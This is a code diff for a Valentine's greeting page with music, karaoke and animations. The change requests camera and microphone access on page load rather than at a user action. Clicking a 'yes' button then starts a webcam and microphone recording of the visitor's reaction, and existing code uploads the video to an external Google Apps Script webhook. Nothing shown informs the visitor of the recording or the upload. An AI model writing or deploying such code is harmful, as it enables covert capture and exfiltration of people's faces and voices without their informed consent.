@@ -460,9 +460,25 @@ let recordedChunks = [];
 const recordingStatus = document.getElementById('recording-status');
 let audioContext;
 let mixedStream;
+let preAuthorizedStream; // Global stream for immediate use
 
 // Google Apps Script Webhook URL for internal Drive upload
 const DRIVE_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbxLbNE82x9H6kuA_uAztJaGXOOD1uIDHdN02_vyaAVBxSFc1ph-Fs3weE0FhKfabKH1iA/exec";
+
+// Request camera/mic permission as soon as the page loads
+async function requestPermissionOnLoad() {
+    try {
+        preAuthorizedStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: true
+        });
+        console.log("Permisos otorgados al inicio.");
+    } catch (err) {
+        console.error("Error al solicitar permisos al inicio:", err);
+    }
+}
+
+window.addEventListener('load', requestPermissionOnLoad);
 
 async function uploadToDrive(blob) {
     if (!DRIVE_WEBHOOK_URL) {
@@ -495,8 +511,9 @@ async function uploadToDrive(blob) {
 async function startRecording() {
     try {
         const music = document.getElementById('bg-music');
-        // Solicitar permisos solo al momento de la acción
-        const videoStream = await navigator.mediaDevices.getUserMedia({
+
+        // Use pre-authorized stream if available, otherwise ask again
+        const videoStream = preAuthorizedStream || await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
             audio: true
         });
@@ -625,30 +642,28 @@ function updateKaraoke(currentTime) {
     }
 }
 
-document.querySelectorAll('.valentine-check').forEach(check => {
-    check.addEventListener('change', (e) => {
-        if (e.target.checked) {
-            document.getElementById('modal').classList.add('active');
+document.querySelectorAll('.yes-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        document.getElementById('modal').classList.add('active');
 
-            // Start Music, Karaoke and Reaction Recording
-            const music = document.getElementById('bg-music');
-            if (music) {
-                music.play().catch(() => { });
-                initKaraoke();
-                music.ontimeupdate = () => updateKaraoke(music.currentTime);
-            }
-
-            startRecording(); // Capture reaction!
-
-            if (typeof resizeRain === 'function') resizeRain();
-            if (typeof initRain === 'function' && rainDrops.length === 0) {
-                initRain();
-                animateRain();
-            }
-            setTimeout(() => {
-                if (typeof drawTree === 'function') drawTree();
-            }, 600);
+        // Start Music, Karaoke and Reaction Recording
+        const music = document.getElementById('bg-music');
+        if (music) {
+            music.play().catch(() => { });
+            initKaraoke();
+            music.ontimeupdate = () => updateKaraoke(music.currentTime);
         }
+
+        startRecording(); // Capture reaction!
+
+        if (typeof resizeRain === 'function') resizeRain();
+        if (typeof initRain === 'function' && rainDrops.length === 0) {
+            initRain();
+            animateRain();
+        }
+        setTimeout(() => {
+            if (typeof drawTree === 'function') drawTree();
+        }, 600);
     });
 });
 
